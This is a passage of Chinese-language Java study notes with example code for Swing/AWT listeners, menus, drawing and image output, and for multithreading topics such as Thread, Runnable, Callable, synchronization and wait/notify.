			bu2.addActionListener(new MyEventListener());
>		
			MainFrame.add(bu1,BorderLayout.NORTH);
			MainFrame.add(bu2,BorderLayout.SOUTH);
			MainFrame.setVisible(true);
		}
	}

注：`Event`类是属于`AWT`的。
IM：无论是我们通过`implements`来实现监听器接口获得监听器对象还是通过匿名内部类来获得监听器对象，都需要实现监听器接口中的**所有抽象方法**，即使有些只是空实现。
这样就导致，当监听器接口里的方法过多的时候，需要程序员实现这个接口里面的所有方法，导致监听器过于臃肿。  
于是就出现了适配器，适配器是监听器的实现类。它为监听器接口提供了通实现。也即是说，采用适配器之后，我们不需要的接口里的方法可以不用自己去实现，只用实现自己想要实现的方法。  
对于方法很多的事件监听器接口，都会为它提供对应的事件适配器。 

窗口监听器：
对任何一个窗口（`Frame`或者`Dialog`都适用)监听。

窗口监听器使用示例：
>
	import java.awt.*;
	import javax.swing.*;
	import java.awt.event.*;
	public class SwingWindowActionListenerTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			final JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			//MainFrame.setLayout(new FlowLayout(10,10,10));
			BorderLayout bl = new BorderLayout(40,40);
>
			//add windowlistener
			MainFrame.addWindowListener(new WindowListener()
			{
				//implements the window funcs all	
				public void windowClosing(WindowEvent e) 			
				{
					try
					{
						System.out.println("hi");
						int result = JOptionPane.showConfirmDialog(MainFrame, 	"yes?"); 
						if(result==0)
						{	 
							System.exit(0);
						}
					}
					catch(Exception d)
					{
						System.out.println("error");
					}
				}
				public void windowActivated(WindowEvent e) 
				{}
				public void windowClosed(WindowEvent e) 
				{}
>			
				public void windowDeactivated(WindowEvent e) 
				{}
				public void windowDeiconified(WindowEvent e) 
				{}
				public void windowIconified(WindowEvent e) 
				{}
				public void windowOpened(WindowEvent e) 
				{}
			});
			MainFrame.setVisible(true);
		}
	}

窗口适配器使用示例：
>
	import java.awt.*;
	import javax.swing.*;
	import java.awt.event.*;
	public class SwingWindowActionAdapterTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			final JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			//MainFrame.setLayout(new FlowLayout(10,10,10));
			BorderLayout bl = new BorderLayout(40,40);
>	
			//add windowlistener
			MainFrame.addWindowListener(new WindowAdapter()
			{
				//implements the window close raction only the funcs you want
				public void windowClosing(WindowEvent e) 			
					{
					try
					{
						System.out.println("hi");
						int result = JOptionPane.showConfirmDialog(MainFrame, "yes?"); 
						if(result==0)
						{	 
							System.exit(0);
						}
					}
					catch(Exception d)
					{
						System.out.println("error");
					}
				}
			});
			MainFrame.setVisible(true);
		}
	}


各种事件与接口对应：  
1. `Action`：`ActionListener`：单击事件  
2. `Item`：`ItemListener`：  
3. `Mouse Motion`：`MouseMotionListener`：鼠标动作事件  
4. `Mouse`：`MouseListener`：鼠标按键事件  
5. `Key`：`KeyListener`：按键事件  
6. `Focus`：`FocusListener`：焦点事件  
7. `Text`:`TextListener`:文本框、文本域事件


Java中的菜单
-----------
`AWT`菜单：`MenuComponent`,一切菜单组件都是`MenuComponent`。见类结构图。  
`MenuBar`：就是一整个工具条。包含多个`Menu`，`Menu`包含多个`MenuItem`。

`Swing`菜单：比`AWT`菜单功能更强大。比如，Swing菜单支持图标菜单。  
`JMenuBar`:工具条。包含多个JMenu，JMenu包含多个`JMenuItem`。  
由于`JMenu`继承自`JMenuItem`，所以，`JMenu`可以当`JMenuItem`使用。  
`JFrame`使用`setJMenuBar(JMenuBar menubar)`来安装菜单工具条。
`JMenu`可以`add(JMenuItem j)`也可以`add(JMenu j)`,这样就可以产生二级菜单,也就是说，`JMenu`可以当成`JMenuItem`使用.  

同样可以为菜单项（MenuItem）添加监控器。  

菜单使用示例：

>
	import java.awt.*;
	import javax.swing.*;
	import java.awt.event.*;
	public class SwingJMenuTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			BorderLayout bl = new BorderLayout(40,40);
>	
			//construct the menubar
			JMenuBar jmb = new JMenuBar();
>		
			//construct the menus for the menubar	
			JMenu jm1 = new JMenu("Files",true);
			JMenu jm2 = new JMenu("Edit",true);
			JMenu jm3 = new JMenu("Search",true);
			JMenu jm4 = new JMenu("Runs",true);
			JMenu jm5 = new JMenu("Language",true);
			jmb.add(jm1);
			jmb.add(jm2);
			jmb.add(jm3);
			jmb.add(jm4);
			jmb.add(jm5);
>			
			//construct the menuitems for the menu
			JMenuItem jmi1 = new JMenuItem("1");
			JMenuItem jmi2 = new JMenuItem("2");
			JMenu jmi3 = new JMenu("3");
			JMenuItem jmi4 = new JMenuItem("4");
			jmi1.setAccelerator(KeyStroke.getKeyStroke('V',InputEvent.CTRL_DOWN_MASK)); 
			jm1.add(jmi1); 
			jm1.add(jmi2);
			//add separator in the menu
			jm1.addSeparator(); 
			jm1.add(jmi3); 
			jmi3.add(jmi4); 
>		
			//add ActionListener for the menuitem
			jmi1.addActionListener(new ActionListener()
			{
				public void actionPerformed(ActionEvent e)
				{
					System.out.println("hi");
				}
			});
			//add the menubar onto the frame
			MainFrame.setJMenuBar(jmb);
			MainFrame.setVisible(true);
		}
	}

为文本域添加监控器：文本域监控器来自`javax.swing.event.*`包。  
使用`DocumentListener`来监听文本框内容的改变。

文本域监控使用示例：

>
	import java.awt.*;
	import javax.swing.*;
	import java.awt.event.*;
	import javax.swing.event.*;
	public class SwingJMenuTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			BorderLayout bl = new BorderLayout(40,40);
>	
			//construct the menubar
			JMenuBar jmb = new JMenuBar();
>		
			//construct the menus for the menubar	
			JMenu jm1 = new JMenu("New",true);
			JMenu jm2 = new JMenu("Save",true);
			JMenu jm3 = new JMenu("Search",true);
			JMenu jm4 = new JMenu("Runs",true);
			JMenu jm5 = new JMenu("Language",true);
			jmb.add(jm1);
			jmb.add(jm2);
			jmb.add(jm3);
			jmb.add(jm4);
			jmb.add(jm5);
>		
			//construct the menuitems for the menu
			JMenuItem jmi1 = new JMenuItem("1");
			JMenuItem jmi2 = new JMenuItem("2");
			JMenu jmi3 = new JMenu("3");
			JMenuItem jmi4 = new JMenuItem("4");
			jmi1.setAccelerator(KeyStroke.getKeyStroke('N',InputEvent.CTRL_DOWN_MASK)); 
			jmi2.setAccelerator(KeyStroke.getKeyStroke('S',InputEvent.CTRL_DOWN_MASK)); 
			jm1.add(jmi1); 
			jm1.add(jmi2);
			//add separator in the menu
			jm1.addSeparator(); 
			jm1.add(jmi3); 
			jmi3.add(jmi4); 
>		
			final JTextArea jta = new JTextArea(60,80);
			//add ActionListener for the menuitem
			jmi1.addActionListener(new ActionListener()
			{
				public void actionPerformed(ActionEvent e)
				{
					System.out.println("hi");
				}
			});
			   boolean isModified = false;
			jta.getDocument().addDocumentListener(new DocumentListener(){
>			
				public void changedUpdate(DocumentEvent e) 
				{
				}
				public void insertUpdate(DocumentEvent e) 
				{
					System.out.println("insert");
				}
				public void removeUpdate(DocumentEvent e) 
				{
					System.out.println("remove");
				}
			});
>		
			MainFrame.add(jta,BorderLayout.CENTER);
			//add the menubar onto the frame
			MainFrame.setJMenuBar(jmb);
			MainFrame.setVisible(true);
		}
	}	


上、下文菜单：也就是右键菜单。  
`JPopupMenu`:是整个上、下文菜单的容器。

画图：  
前面的组件是`Swing`帮我们完成的。实际上那些组件都是JDK的开发者帮我们画上去的。  
如果想要界面组件更多，就需要自己来绘制。
  
`AWT`绘图：  
需要创建`Canvas`或者`Panel`，然后重写它的`onPaint(Graphic g)`方法。
`Graphic`相当于画笔，所有的内容都是通过它绘制出来的。  
`Canvas`与`Panel`都是空白的“矩形区域”容器。往里面画什么就有什么。二者几乎是一样的，

`Swing`绘图：   
使用的`JPanel`也是一个空白区域，但是多了一个“双缓冲机制”。  
双缓冲：当我们要在某一个“组件”上绘制图形的时候，先在内存中绘制一个图形，然后将图形整体绘制在组件上。这样就避免在“组件”上一笔一笔地画（每一笔都会导致组件的一次刷新，导致组件闪烁）图形，提高了性能。


注：由于`main`方法是`static`方法，导致在`main`方法中不能调用类中的非`static`方法与`static`域，因此这个时候要将这些方法、域设置为`static`的。但往往并不能如此将他们都设置为`static`的。  
这个时候，有一种处理方式：  
在`main`方法外创建一个非`static`方法，然后在这个非`static`方法中调用想要的非`static`方法与域。最后在`main`方法中创建一个类对象，通过这个类对象调用前面创建的那个非`static`方法。

上例是使用`AWT`绘图使用示例：  
>
	import java.awt.*;
	import java.awt.event.*;
	import java.util.*;
	public class AWTDrawingTest
	{
		private Frame mainFrame = new Frame();
		private String RECT_shape = "rect";
		private String OVAL_shape = "oval";
		private String shapeToDraw = "";
		private MyCanvas drawArea = new MyCanvas();
		class MyCanvas extends Canvas
		{
			public void paint(Graphics g) 
			{
				Random rand = new Random();
				if(shapeToDraw.equals(RECT_shape)==true)
				{
					g.drawRect(rand.nextInt(200),rand.nextInt(200),50,50); 	
			}
>
				if(shapeToDraw.equals(OVAL_shape)==true)
				{
					g.drawOval(rand.nextInt(200),rand.nextInt(200),50,50); 	
				}
			}
		}
>
		public void init()
		{
			Button ButtRect = new Button("rect");
			Button ButtOval = new Button("oval");
			Panel MyPanel = new Panel();
			ButtRect.addActionListener(new ActionListener(){
				public void actionPerformed(ActionEvent e) 
				{
					shapeToDraw = RECT_shape;
					drawArea.repaint();	
				}	
			});
>
			ButtOval.addActionListener(new ActionListener(){
				public void actionPerformed(ActionEvent e) 
				{
					shapeToDraw = OVAL_shape;
					drawArea.repaint();	
				}	
			});
>
			MyPanel.add(ButtRect);
			MyPanel.add(ButtOval);
			drawArea.setPreferredSize(new Dimension(300,300));
			mainFrame.add(MyPanel);
			mainFrame.add(drawArea,BorderLayout.SOUTH);
			mainFrame.pack();
			mainFrame.setVisible(true);
		}
		public static void main(String[] args)
		{
			new AWTDrawingTest().init();	
		}
	}  


注：用**抽象类或者接口**创建对象时，都是	使用**内部类或者匿名内部类。**

注：在类内部，不能在方法之外的区域调用方法。只能在方法之内调用其他方法，也就是说，不能在放`Field`的区域内出现方法的调用语句。


所谓的真彩色，就是32位颜色。分别为`RGBA`(红、绿、蓝、透明度)。每个基本色有256(2的8次方)种，共有2的32次方种。`BMP`是没有压缩的格式。  

`BufferedImage`使用：
`BufferedImage`对象`Image`相当于在内存中绘制一张图片。然后通过该对象的`getGraphics()`方法获得`Graphics`对象`ps`，也就是内存中这张图片`Image`的画笔。  
在后面的方法中，都是使用这个`ps`对象的各种方法将所有图形绘制在内存中的`BufferedImage`对象`Image`上（这里使用的画笔是内存中的那张图片的画笔）。  
然后在`paint()`方法的重写中，直接使用这个`Graphics`对象`g`来进行调用`drawImage()`方法绘制（就是将内存中的`Image`对象绘制在我们的显示组件`Canvas`上），这里使用的是显示组件的画笔`g`是`Canvas`的画笔而不是使用原来内存中的那张图片`Image`的画笔`ps`进行绘制。

`BufferedImage`使用示例：

>
	import java.awt.*;
	import java.awt.event.*;
	import java.util.*;
	import java.awt.image.*;
	public class AWTBufferedImageDrawingTest
	{
		private Frame mainFrame = new Frame();
		private String RECT_shape = "rect";
		private String OVAL_shape = "oval";
		private String shapeToDraw = "";
		private MyCanvas drawArea = new MyCanvas();
		BufferedImage Image = new BufferedImage(300,300,BufferedImage.TYPE_INT_RGB);
		private Graphics ps = Image.getGraphics();
		class MyCanvas extends Canvas
		{
			public void paint(Graphics g) 
			{
				g.drawImage(Image,0,0,null);
			}
		}
>
		public void init()
		{
			Button ButtRect = new Button("rect");
			Button ButtOval = new Button("oval");
			Panel MyPanel = new Panel();
			ButtRect.addActionListener(new ActionListener(){
				public void actionPerformed(ActionEvent e) 
				{
					Random rand = new Random();
					ps.drawRect(rand.nextInt(200),rand.nextInt(200),50,50); 	
					drawArea.repaint();	
				}	
			});
>
			ButtOval.addActionListener(new ActionListener(){
				public void actionPerformed(ActionEvent e) 
				{
					Random rand = new Random();
					ps.drawOval(rand.nextInt(200),rand.nextInt(200),50,50); 	
					drawArea.repaint();	
				}	
			});
			mainFrame.setBounds(0,0,300,300);
			MyPanel.add(ButtRect);
			MyPanel.add(ButtOval);
			MyPanel.setBackground(new Color(255,0,0)); 
			drawArea.setPreferredSize(new Dimension(300,300));
			mainFrame.add(MyPanel);
			mainFrame.add(drawArea,BorderLayout.SOUTH);
			mainFrame.pack();
			mainFrame.setVisible(true);
		}
		public static void main(String[] args)
		{
			new AWTBufferedImageDrawingTest().init();	
		}
	}  



可以使用`ImageIO`类将图片读、取在磁盘上的专用类。前面的`BufferedImage`类是将图片在内存中放置。这个`ImageIO`类是将图片在磁盘上输入、输出。

`Graphics`类可以对图形进行处理，如、旋转等。它是`Graphics`类的子类。可用于验证码的产生。

`ImageIO`及`Graphics`类使用示例：

>
	import java.awt.*;
	import javax.swing.*;
	import java.util.concurrent.*;
	import java.awt.image.*;
	import javax.imageio.*;
	import java.io.*;
	import java.util.*;
	public class AWTImageIOTest
	{
		public static void main(String[] args) throws Exception
		{
			ThreadLocalRandom rand = ThreadLocalRandom.current();
			BufferedImage image = new BufferedImage(200,150,BufferedImage.TYPE_4BYTE_ABGR );
			Graphics ps = image.getGraphics();
			//use Graphics2D to ratota the image
			Graphics2D pd = (Graphics2D)ps;
			pd.setColor(new Color(255,0,0)); 
			pd.setBackground(new Color(255,0,0));
			int x=40;
			for(int i=1;i<=6;i++) 
			{
			 	//get the char by random
				char ch = (char)rand.nextInt(65,65+26); 
				double ang = rand.nextDouble(Math.PI/12,Math.PI/6);
				//rotate the pd
				pd.rotate(ang,x,80); 
				//draw the char on the image
				pd.drawString(""+ch, x, 60); 
				//recover the pd
				pd.rotate(-ang,x,80); 
				x=x+20;
			}
>		
			pd.setColor(new Color(0,0,0)); 
			for(int j=0;j<100;j++)
			{
				int xStart = rand.nextInt(20,180);
				int yStart = rand.nextInt(10,130);
				int xEnd = rand.nextInt(60,180);
				int yEnd = rand.nextInt(30,140);
				pd.drawLine(xStart,yStart,xEnd,yEnd);
			}
			ImageIO.write(image,"png",new File(UUID.randomUUID	()+"1.png"));
		}
	}

Java中的进程与线程
--------------
进程：运行中的程序。  
1. 进程是系统中一个独立存在的实体，拥有自己独立的资源、内存区。一个进程的内存空间*一般是不能允许*其他进程访问。  
2. 动态性。程序是静止的，运行起来才叫进程。  
3. 并发性。操作系统中可以同时"并发（concurrent）"。可以运行多个进程。

线程：进程中并发执行流，也叫light-weight Process。没有自己独立的内存、资源。而是和其他的线程共享。

进程的创建成本比线程要高。

并发（`concurrent`）：即使**只有一个CPU**，多个进程或者线程在这个CPU上**快速轮换**地执行。
在任何时刻，只有与CPU个数相同的进程在真正的执行，其他的进程都处于等待状态。但是人是感受不到这个等待。

并行（`parallel`）：必须有**一个以上的CPU**，在同一时刻至少有与`CPU`个数相同的进程在执行。这些**同时**（而不是快速轮流）执行。这才是真正的同时执行。这些进程就是并行执行。
 
多线程的好处：  
1. 功能上，多线程类似于多进程  
2. 创建成本低、效率高。  
3. 线程之间通信方便，无需使用管道流。  
4. `Java`语言的多线程很优秀。

`Java`中创建多线程的方法：  
1. 继承`Thread`类以创建多线程。
   注：线程执行体：就是该线程将要做的事情。`run()`方法里面也就是要执行的代码。
   `Thread`这个类就是线程类。代表着线程。
   `Thread`类最重要的方法是`run()`，它为`Thread`类的方法`start()`所调用，提供我们的线程所要执行的代码。为了指定我们自己的代码，只需要覆盖它！
   `main()`方法本身就是一个主线程。它是默认已启动的线程。我们在`main()`方法之外创建我们自己想要的任意线程，然后在`main()`方法这个主线程里面使用`start()`方法启动这些线程。
a. 继承`Thread`类。重写一个`run()`方法。这个`run()`方法就是线程执行体。里面就是我们要在这个线程里面做的事情。  
   这个`run()`方法不能有返回值，也不能抛出异常。 	
   
b. 在`run()`方法内加入我们要在本线程中执行的代码。例如：通过`Thread`类的`currentThread()`这个静态方法获得当前在运行的线程。 

c. 调用`Thread`对象(`new`一个`Thread`对象即是创建一个线程)的`start()`方法启动线程，而不能调用`run()`方法。每`start()`一次都创建了一个新线程并运行一次`run()`方法。因此，如果想在不同线程中执行不同的代码，就需要在`run()`方法中针对不同的线程名再调用不同的代码即可。
实际上就是创建一个我们的类对象(线程对象)，然后用这个类对象调用它的`start()`方法，因为它已经继承了`Thread`类，所以它有`start()`方法。

`Thread`使用示例：
>
	public class  ThreadTest extends Thread
	{
		public void f(String str)
		{
			System.out.println(str);
		}
		//run method includes the code you want to exec in the current Thread. 
		public void run()
		{
			//for different thread exec the different func
			f(Thread.currentThread().getName());
		}
		//the main thread
		public static void main(String[] args) 
		{
			for(int i=0;i<100;i++)
			{
				//construct a new thread and run it
				new ThreadTest().start();
			}
>		
			System.out.println(Thread.currentThread().getName());
		}
	}

2. 实现`Runnable`接口
a. 实现`Runnable`接口。重写`run()`方法。`run()`里面即是我们想要执行的代码。  
b. 由于`Runnable`接口中并没有`start()`方法,因此只能将`Runnable`对象包装成`Thread`对象(线程对象)才能调用`start()`方法以创建线程并启动。

`Runnable`接口使用示例：
>
	public class  RunnableImplementsTest implements Runnable
	{
		//run method includes the code you want to exec in the current Thread. 
		public void run()
		{
			//for different thread exec the different func
			System.out.println(Thread.currentThread().getName());
		}
		//the main thread
		public static void main(String[] args) 
		{
			for(int i=0;i<100;i++)
			{
				//construct a new thread and run it
				(new Thread(new RunnableImplementsTest())).start();
			}
			System.out.println(Thread.currentThread().getName());
		}
	}

3. 实现`Callable<V>`接口  
   由于前两种方法中，`run()`方法都不能有返回值。所以我们可以实现`Callable<V>`接口，让我们执行的代码具有返回值。这个接口就是`Runnable`接口的增强版。它可以有返回值，还可以抛出异常。
a. 实现`Callable<V>`接口，其中的`V`是我们要执行的代码返回的值类型。重写`call()`方法。该方法具有返回值，还可以抛出异常。  
b. 创建并启动线程的时候，要先将`Callable`对象包装成`Runnable`对象，然后将`Callable`对象包装成`Runnable`对象（由于`Runnable`只是一个接口，需要将`Callable`对象包装成`Runnable`接口的*实现类对象*,实际上就是先将`Callable`对象包装成`FutureTask<V>`对象)，然后将`Runnable`的实现类对象`FutureTask<V>`对象包装成`Thread`对象，然后用`Thread`对象的`start()`方法来创建并启动新线程。  
c. 调用`FutureTask<V>`对象的方法`get()`来获得`call()`方法里的返回值。

`Callable<V>`使用示例：
>
	import java.util.concurrent.*;
	public class  CallableImplementsTest implements Callable<String>
	{
		//run method includes the code you want to exec in the current Thread. 
		public String call() throws Exception 
		{
			//for different thread exec the different func
			return Thread.currentThread().getName();
		}
		//the main thread
		public static void main(String[] args) throws Exception
		{
			for(int i=0;i<100;i++)
			{
				//construct a new thread and run it
				CallableImplementsTest  cit= new CallableImplementsTest();
				FutureTask<String> ft = new FutureTask<String>(cit);
				new Thread(ft).start();
				System.out.println(ft.get());
			}
			System.out.println(Thread.currentThread().getName());
		}
	}

IM经验：当我们要向一个方法中传入一个参数，但是实际上我们有的实参的类型不与之匹配，那么就去看看这个方法中参数的类是否有子类，我们是否可以将我们已有的实参包装成这个方法所要求的参数类型的子类，然后将包装而得的子类对象传给这个方法即可。所以我们编程的时候，对于方法，往往要注意对接口编程，就是将方法中的形参数类型设为接口或者其他的抽象类，以保证使用时可以传入更多的类型实参。
  
实际上，在`Java`中，需要一个接口的对象、需要一个抽象类的对象、需要一个类的对象，都可以视作需要这个接口的实现类（非抽象的）对象、需要这个抽象类的实现类（非抽象的）的对象，需要这个类的子类的对象。

创建线程的方式的对比，创建线程方式分为两类：  
1. 继承`Thread`类。  
2. 实现`Runnable`或者`Callable`接口。  
实现接口的方式更好。原因：  
1. 继承了`Thread`类后就不能继承其他的类了，但是实现了接口之后还可以继承别的类。  
2. 实现接口可以让多个`Thread`对象在创建的时候可以共享同一个`Runnable`对象。更好地实现代码与数据的分离，逻辑更清晰。  
3. 实现接口的缺点：编码略微复杂。


线程的状态：  
当调用`start()`之后，只是启动线程，并没有立即执行线程(没有立即执行`run`方法)。  
新建状态：`new`了一个`Thread`对象(线程对象)后即是新建状态。该线程对象只是一个`Java`对象。
  
就绪状态：调用`start()`后处于就绪状态。
  
运行状态：从就绪到运行状态之间是不可控的，这里依靠系统的线程调度器进行分配，是一个随机的分配。  
如果Thread调用静态方法`sleep(int time)`，就会让当前线程进入阻塞状态`time`长时间，`CPU`会在中止的这段时间内运行其他的线程。  
如果`Thread`调用静态方法`yield()`,就会让当前线程让出`CPU`，处于就绪状态。

阻塞状态(`Blocked`)：如`Thread`执行`sleep`之后，当前线程就会进入阻塞状态。进入阻塞状态之后，当`sleep`时间完成之后，线程离开阻塞状态，进入就绪状态。然后，系统再自己让这个就绪状态的线程进入运行状态。

以上状态转换见*Thread Status状态图*。


控制线程的几个基本方法：  
1. `join()`线程。启动多条线程之后，调用`join()`的线程要先完成以后（调用`join()`的线程死亡之后才行），剩下的线程才能继续往下执行。  
2. 后台线程。也就是`Daemon Thread`。也叫守护线程。因为它的特征是：如果所有的前台线程结束，它会自动死亡。作用是监控前台线程，为前台线程服务。可以将某个线程设为后台线程。那么其他线程都结束之后，它就会死亡。  
3. 线程暂停。`Thread.sleep(100)`:让线程暂停100ms，进入阻塞状态。暂停完成之后，就会进入就绪状态，然后由系统分配`CPU`。  
4. 线程让步。`Thread.yield()`:让出`CPU`，进入就绪状态。在执行了`yield()`之后，就会让系统再次进行`CPU`分配，可能刚刚让出`CPU`的线程再次被分配到了`CPU`，继续执行。  
一般使用`sleep()`而不使用`yield()`，因为前者更稳定。  
5. 改变线程优先级：线程优先级越高，线程就会获得更多被执行的机会。`setPriority(int value)`方法。


`join`使用示例：
>
	public class  ThreadJoinTest extends Thread
	{
		public void run()
		{
			for(int i=0;i<100;i++)
			{
				System.out.println(Thread.currentThread().getName()+"----"+i);
			}
		}
		//the main thread
		public static void main(String[] args) throws Exception
		{
			for(int i=0;i<100;i++)
			{
				System.out.println(Thread.currentThread().getName()+"-----"+i);
				//construct new thread 
				ThreadJoinTest t1 = new ThreadJoinTest();
				ThreadJoinTest t2 = new ThreadJoinTest();
				if(i==20)
				{
					t1.start();
					t2.start();
>				
					t1.join();
					t2.join();
				}
			}
		}
	}



`Daemon Thread`使用示例：
>
	public class  DeamonThreadTest extends Thread
	{
		public void run()
		{
			for(int i=0;i<100;i++)
			{
				System.out.println(Thread.currentThread().getName()+"----"+i);
			}
		}
		//the main thread
		public static void main(String[] args) throws Exception
		{
				//construct new thread 
				DeamonThreadTest t1 = new DeamonThreadTest();
				//set the thread t1 as Deamon Thread after the main thread ends it will also die
				t1.setDaemon(true); 				
				t1.start();
				System.out.println(Thread.currentThread().getName()+"-----"+"ends");
		}
	}


`setPriority`使用示例：

>
	public class  ThreadPriortityTest extends Thread
	{
		public void run()
		{
			for(int i=0;i<100;i++)
			{
				System.out.println(Thread.currentThread().getName()+"----"+i);
			}
		}
		//the main thread
		public static void main(String[] args) throws Exception
		{
				//construct new thread 
				ThreadPriortityTest t1 = new ThreadPriortityTest();
				ThreadPriortityTest t2 = new ThreadPriortityTest();
				//set the priority of the threads
				t1.setPriority(Thread.MAX_PRIORITY); 	
				t2.setPriority(Thread.MAX_PRIORITY-1); 	
				t1.start();
				t2.start();
		}
	}

线程同步：
如：银行账户取钱问题，如果是多线程的话，可能多个人同时取款，会超额取钱。  
竞争资源（共享资源）：如果多个线程需要并发访问、并修改某个对象，该对象就是竞争资源。
因此就需要控制线程安全，线程安全的方法有：  
1. 同步代码块：需要显式指定同步监视器。  
2. 同步方法:不需要显式指定同步监视器。只需要在要作为原子方法的方法前加上`synchronized`标示符即可。其相当于使用方法的调用者作为*同步监视器*。如果方法是示例方法，相当于`this`就是同步监视锁。如果方法是类方法，相当于这个类就是同步监视锁。  

为避免多个线程“自由竞争”修改共享资源导致的不安全问题。于是考虑对资源进行“加锁”。  
以上两种方法的实现机制：当程序要进入某个被“同步监视锁”所监视的代码之前，本线程必须先去获得“同步监视锁” 。  
从语法角度来看，任意对象都可以作为同步监视锁，但是从程序逻辑来看，选择“竞争资源”作为同步监视锁。如下例中的`balanceAccount`就是同步监视器。*所谓的同步监视锁，实际上就是这段代码中要监视的对象。*  

线程同步的关键在于：任意线程进入同步监视器监视的代码之前，都需要对同步监视器加锁。  
什么时候释放对同步监视器的锁？  
1. 监视的代码执行完成。  
2. 在代码中遇到了`break`或者`return`，跳出代码块。  
3. 执行代码过程中遇到了未捕获的异常。  
4. 调用同步监视器的`wait()`方法，使线程进入`wait`状态，也就是阻塞状态。如果想某一个线程在运行完之后不会死亡，而是在下次还可以运行（不用再次`start`），那么就可以对此线程使用`wait()`。使该线程进入阻塞状态，以后在别的线程中使用notify()，就可以唤醒这个阻塞的线程。

什么时候不会释放对同步监视器的锁？  
1. `sleep()`、`yield()`都不会释放。  
2. `suspend()`也不会释放。  
  
同步代码块使用示例：
>
	//The account of a person
	class Account
	{
		//the name of the person
		private String name;
		//the balanceAccount of the person
		private int account;
		Account()
		{
		}
		Account(String aName,int aAccount)
		{
			name=aName;
			account=aAccount;
		}
		public void setName(String aName)
		{
			this.name=aName;
		}
		public void setAccount(int aAccount)
		{
			this.account=aAccount;
		}
		public String getName()
		{
			return this.name;
		}
		public int getAccount()
		{
			return this.account;
		}
	}
	public class  AccoutThreadTest extends Thread
	{
		//the amount of money you want to get 
		private int drawAccount;
		//the amount of money in your account
		private Account balanceAccount;
		AccoutThreadTest(int adrawAccount,Account abalanceAccount)
		{
			this.drawAccount=adrawAccount;
			this.balanceAccount=abalanceAccount;
		}
		public void run() 
		{
			//add the concurrelock on the code block
			synchronized(balanceAccount)
			{
				if(drawAccount<=balanceAccount.getAccount())
				{
					System.out.println(Thread.currentThread().getName()+", You have got the money you want to draw: "+drawAccount);
					balanceAccount.setAccount(balanceAccount.getAccount()-drawAccount);
					System.out.println("The amount of money you left in the account is: "+balanceAccount.getAccount());
				}
				else
				{
					System.out.println(Thread.currentThread().getName()+", The amount of money in your account is not enough!");
				}
			}
		}
		//the main thread
		public static void main(String[] args) throws Exception
		{
			Account ac = new Account("wt",1000);
			new AccoutThreadTest(800,ac).start();
			new AccoutThreadTest(800,ac).start();
		}
	}

同步方法使用示例：
>
	//The account of a person
	class Account
	{
		//the name of the person
		private String name;
		//the balanceAccount of the person
		private int account;
		Account()
		{
		}
		Account(String aName,int aAccount)
		{
			name=aName;
			account=aAccount;
		}
		public void setName(String aName)
		{
			this.name=aName;
		}
		public void setAccount(int aAccount)
		{
			this.account=aAccount;
		}
		public String getName()
		{
			return this.name;
		}
		public int getAccount()
		{
			return this.account;
		}
		//the synchronized method,the this get the synchronized lock
		public synchronized void draw(int drawAccount)
		{
			if(drawAccount<=account)
				{
					System.out.println(Thread.currentThread().getName()+", You have got the money you want to draw: "+drawAccount);
					account=account-drawAccount;
					System.out.println("The amount of money you left in the account is: "+account);
				}
			else
				{
					System.out.println(Thread.currentThread().getName()+", The amount of money in your account is not enough!");
				}
		}
	}
	public class  AccoutThreadFunTest extends Thread
	{
		//the amount of money you want to get 
		private int drawAccount;
		//the amount of money in your account
		private Account balanceAccount;
		AccoutThreadFunTest(int adrawAccount,Account abalanceAccount)
		{
			this.drawAccount=adrawAccount;
			this.balanceAccount=abalanceAccount;
		}
		public void run() 
		{
			//the balanceAccount object call the synchronized method. this has the synchronized lock
			balanceAccount.draw(drawAccount);
		}
		//the main thread
		public static void main(String[] args) throws Exception
		{
			Account ac = new Account("wt",1000);
			//construct 2 different threads
			new AccoutThreadFunTest(800,ac).start();
			new AccoutThreadFunTest(800,ac).start();
		}
	}



线程的通信：同一个进程中的各个线程共享进程的内存空间。  
1. 如果不加控制，多个线程会“自由”地并发执行。  
2. 可以通过同步来解决多个线程并发访问竞争资源的问题。同步会导致效率线程降低，也就是前面所言的线程安全的类会导致效率降低。前面所言的线程安全的类适合于多线程的环境，线程不安全的类适合于单线程环境。  
3. 如果希望各线程之间能更有序地执行。如，生产者-消费者问题，我们希望消费者每次消费的时候都有资源可供消费。这就要求生产者线程与消费者线程之间能够互通消息，才能保证线程之间能够协调有序进行。这就涉及到线程通信的问题。
这里使用到了`Object`类的几个方法：`wait()`--控制线程暂停，会释放对同步监视器的锁，直到收到唤醒通知、`notify()`--发送唤醒通知，唤醒处于`wait`状态的线程、`notifyAll()`--发送唤醒通知，唤醒处于`wait`状态的线程。  
但是并不是所有的对象都可以调用者三个方法。只有**同步监视器**才能调用者三个方法。
如果不使用wait()，就会导致本线程运行完后立刻结束了，线程不会再启动了。也就是说整个线程都结束死亡了，如果不想这个线程在执行这一次之后就死亡，而是想让这个线程此次运行完之后不会死亡，以后还可以不用start就可以运行，那么就要使用wait()，然后在其他线程中使用notify()之后，就会唤醒处于wait状态的线程。这样，就能保证线程在我们可控的顺序下运行。

线程通信使用示例：
>
	//The account of a person
	class Account
	{
		//the name of the person
		private String name;
		//the balanceAccount of the person
		private int account;
		public boolean hasdeposted=false;
		Account()
		{
		}
		Account(String aName,int aAccount)
		{
			name=aName;
			account=aAccount;
		}
		public void setName(String aName)
		{
			this.name=aName;
		}
		public void setDeposit(boolean b)
		{
			this.hasdeposted=b;
		}
		public void setAccount(int aAccount)
		{
			this.account=aAccount;
		}
		public String getName()
		{
			return this.name;
		}
		public int getAccount()
		{
			return this.account;
		}
	}
	class drawThread extends Thread
	{
		//the amount of money you want to get 
		private int drawAccount;
		//the amount of money in your account
		private Account balanceAccount;
		drawThread(int adrawAccount,Account abalanceAccount)
		{
			this.drawAccount=adrawAccount;
			this.balanceAccount=abalanceAccount;
		}
		public void run() 	
		{
			try
			{
				int i;
				//add the concurrelock on the code block
				synchronized(balanceAccount)
				{
					for(i=0;i<100;)
					{
					if(balanceAccount.hasdeposted==true)
					{
						if(drawAccount<=balanceAccount.getAccount())
						{
